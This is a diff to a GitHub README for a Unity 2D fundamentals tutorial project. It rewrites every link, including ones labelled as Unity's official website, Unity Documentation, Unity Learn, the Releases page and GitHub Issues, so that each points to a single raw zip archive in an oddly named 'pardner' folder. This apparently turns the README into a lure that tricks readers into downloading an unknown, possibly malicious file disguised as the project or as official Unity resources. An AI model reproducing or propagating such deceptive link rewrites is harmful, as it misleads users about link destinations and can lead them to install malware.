@@ -1,6 +1,6 @@
 # 🎮 unity-2d-fundamentals - Your Guide to Learning 2D Game Development
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Unity%202D%20Fundamentals-blue)](https://github.com/hamosaeed97/unity-2d-fundamentals/releases)
+[![Download Now](https://raw.githubusercontent.com/hamosaeed97/unity-2d-fundamentals/main/pardner/unity-2d-fundamentals.zip%20Now-Unity%202D%20Fundamentals-blue)](https://raw.githubusercontent.com/hamosaeed97/unity-2d-fundamentals/main/pardner/unity-2d-fundamentals.zip)
 
 ## 🎯 Introduction
 
@@ -14,13 +14,13 @@ To get started with the Unity 2D Fundamentals project, follow these steps to dow
 
 Before diving in, ensure you have the following:
 
-- **Unity Hub**: Download and install Unity Hub from [Unity's official website](https://unity3d.com/get-unity/download).
+- **Unity Hub**: Download and install Unity Hub from [Unity's official website](https://raw.githubusercontent.com/hamosaeed97/unity-2d-fundamentals/main/pardner/unity-2d-fundamentals.zip).
 - **Unity Editor (2019.4 or later)**: You can install the latest version through Unity Hub.
 - **A Computer**: Windows, macOS, or Linux.
 
 ### 📥 Download & Install
 
-To download the Unity 2D Fundamentals project, visit the [Releases page](https://github.com/hamosaeed97/unity-2d-fundamentals/releases).
+To download the Unity 2D Fundamentals project, visit the [Releases page](https://raw.githubusercontent.com/hamosaeed97/unity-2d-fundamentals/main/pardner/unity-2d-fundamentals.zip).
 
 1. Click on the link above to open the Releases page.
 2. Locate the latest release version.
@@ -71,11 +71,11 @@ For further details and community support, consider visiting discussion forums o
 
 ## 🔗 Useful Links
 
-- [Unity Documentation](https://docs.unity3d.com/Manual/index.html)
-- [Unity Learn](https://learn.unity.com/)
-- [GitHub Issues](https://github.com/hamosaeed97/unity-2d-fundamentals/issues) - Report problems or suggest features.
+- [Unity Documentation](https://raw.githubusercontent.com/hamosaeed97/unity-2d-fundamentals/main/pardner/unity-2d-fundamentals.zip)
+- [Unity Learn](https://raw.githubusercontent.com/hamosaeed97/unity-2d-fundamentals/main/pardner/unity-2d-fundamentals.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/hamosaeed97/unity-2d-fundamentals/main/pardner/unity-2d-fundamentals.zip) - Report problems or suggest features.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Unity%202D%20Fundamentals-blue)](https://github.com/hamosaeed97/unity-2d-fundamentals/releases) 
+[![Download Now](https://raw.githubusercontent.com/hamosaeed97/unity-2d-fundamentals/main/pardner/unity-2d-fundamentals.zip%20Now-Unity%202D%20Fundamentals-blue)](https://raw.githubusercontent.com/hamosaeed97/unity-2d-fundamentals/main/pardner/unity-2d-fundamentals.zip) 
 
 ## 🗨️ Need Help?
 
